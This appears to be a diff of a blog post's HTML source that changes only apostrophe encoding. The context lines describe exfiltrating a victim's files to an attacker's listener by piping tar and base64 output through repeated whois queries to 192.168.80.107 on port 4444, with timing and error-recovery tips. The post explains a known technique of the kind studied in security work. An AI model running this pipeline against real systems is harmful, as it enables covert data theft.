@@ -27,7 +27,7 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, a lot of respondents mentioned that you could use the &lt;code&gt;/dev/tcp&lt;/code&gt; method or &lt;code&gt;awk&lt;/code&gt;.&lt;/p&gt;
 &lt;blockquote class=&#34;twitter-tweet&#34; data-conversation=&#34;none&#34; data-lang=&#34;en&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Why whois?&lt;br&gt;&lt;br&gt;TCP&lt;a href=&#34;https://t.co/6UstTUeJ4M&#34;&gt;https://t.co/6UstTUeJ4M&lt;/a&gt;&lt;br&gt;&lt;br&gt;awk&lt;a href=&#34;https://t.co/QlCoAXFvKh&#34;&gt;https://t.co/QlCoAXFvKh&lt;/a&gt;&lt;br&gt;&lt;br&gt;Much easier and faster!&lt;/p&gt;&amp;mdash; Malwrologist (@DissectMalware) &lt;a href=&#34;https://twitter.com/DissectMalware/status/1102781062911066112?ref_src=twsrc%5Etfw&#34;&gt;March 5, 2019&lt;/a&gt;&lt;/blockquote&gt;
 &lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
-&lt;p&gt;While this is awesome and true, and for practicality should be used instead of &lt;code&gt;whois&lt;/code&gt;,  it is more about the mental stretch and exercise for me. You never know, there might a situation where you can&#39;t use either of those and &lt;code&gt;whois&lt;/code&gt; is still there.&lt;/p&gt;
+&lt;p&gt;While this is awesome and true, and for practicality should be used instead of &lt;code&gt;whois&lt;/code&gt;,  it is more about the mental stretch and exercise for me. You never know, there might a situation where you can&amp;rsquo;t use either of those and &lt;code&gt;whois&lt;/code&gt; is still there.&lt;/p&gt;
 &lt;p&gt;This is the solution I came up with to both increase the file size limit, and add a bit of error correction:&lt;/p&gt;
 &lt;p&gt;(Here is my reply: &lt;a href=&#34;https://twitter.com/mubix/status/1102780435271176198&#34;&gt;https://twitter.com/mubix/status/1102780435271176198&lt;/a&gt;)&lt;/p&gt;
 &lt;h3 id=&#34;first-we-set-up-a-listener&#34;&gt;First we set up a listener:&lt;/h3&gt;
@@ -46,7 +46,7 @@
 &lt;li&gt;&lt;code&gt;tar czf - /bin/*&lt;/code&gt;: Create a &lt;code&gt;tar&lt;/code&gt; ball using compression(&lt;code&gt;c&lt;/code&gt;), and gzip(&lt;code&gt;z&lt;/code&gt;) to the file(&lt;code&gt;f&lt;/code&gt;) of standard output(&lt;code&gt;-&lt;/code&gt;) using all of the files in the &lt;code&gt;bin&lt;/code&gt; folder (&lt;code&gt;/bin/*&lt;/code&gt;)&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;base64&lt;/code&gt;: Base64 encode that standard output&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;xargs -I bits&lt;/code&gt;: for every line do the following command while replacing the word &lt;code&gt;bits&lt;/code&gt; in the command with the contents of the preceding lines (from the base64)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;timeout 0.03&lt;/code&gt;: This times out the &lt;code&gt;whois&lt;/code&gt; command so that it closes the connection because there isn&#39;t a response from the other end (it&#39;s just capturing packets). This is REALLY fast and only should be used in LAN connections. Set the timeout to &lt;code&gt;0.10&lt;/code&gt; or similar for doing things across the Internet.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;timeout 0.03&lt;/code&gt;: This times out the &lt;code&gt;whois&lt;/code&gt; command so that it closes the connection because there isn&amp;rsquo;t a response from the other end (it&amp;rsquo;s just capturing packets). This is REALLY fast and only should be used in LAN connections. Set the timeout to &lt;code&gt;0.10&lt;/code&gt; or similar for doing things across the Internet.&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;whois -h 192.168.80.107 -p 4444 bits&lt;/code&gt;: Send the &lt;code&gt;bits&lt;/code&gt;(which is replaced with the base64 line) &lt;code&gt;whois&lt;/code&gt; query to &lt;code&gt;192.168.80.107&lt;/code&gt; over port &lt;code&gt;4444&lt;/code&gt;.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;What you should see on the attacker side is a bunch of Base64 lines scrolling across the screen.&lt;/p&gt;
@@ -62,10 +62,10 @@
 &lt;h3 id=&#34;errors&#34;&gt;Errors:&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;
-&lt;p&gt;If you receive a &lt;code&gt;base64: invalid input&lt;/code&gt; when doing the final step it is most likely that your timeout was too fast and some of the lines didn&#39;t transfer completely.&lt;/p&gt;
+&lt;p&gt;If you receive a &lt;code&gt;base64: invalid input&lt;/code&gt; when doing the final step it is most likely that your timeout was too fast and some of the lines didn&amp;rsquo;t transfer completely.&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;If you get something like the following you have had some corruption during the transfer. This can happen and does so a lot during such a long transfer (13 MB took 98 minutes as you&#39;ll see below).&lt;/p&gt;
+&lt;p&gt;If you get something like the following you have had some corruption during the transfer. This can happen and does so a lot during such a long transfer (13 MB took 98 minutes as you&amp;rsquo;ll see below).&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;pre&gt;&lt;code&gt;bin/bash
@@ -80,7 +80,7 @@ tar: Error is not recoverable: exiting now
 &lt;p&gt;One improvement to the speed is the number of bytes you send with each &lt;code&gt;whois&lt;/code&gt; request, which is based on the line length of the base64 output with the &lt;code&gt;-w&lt;/code&gt; flag. I have been able to increase this to 255 without much trouble like so: &lt;code&gt;base64 -w255&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Example:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;tar czf - /bin/* | base64 -w255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Even with this speed up sending all of &lt;code&gt;/bin/&lt;/code&gt; took 98 minutes using a timeout of &lt;code&gt;0.20&lt;/code&gt;. You can decrease this considerably depending on the network connection you have between the victim and attackerbox, but you need to be careful or you&#39;ll end up with corrupted data if you go too fast.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Even with this speed up sending all of &lt;code&gt;/bin/&lt;/code&gt; took 98 minutes using a timeout of &lt;code&gt;0.20&lt;/code&gt;. You can decrease this considerably depending on the network connection you have between the victim and attackerbox, but you need to be careful or you&amp;rsquo;ll end up with corrupted data if you go too fast.&lt;/p&gt;
 &lt;p&gt;Size of &lt;code&gt;/bin/&lt;/code&gt;:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root@victim:~# du -h /bin/
 13M     /bin/
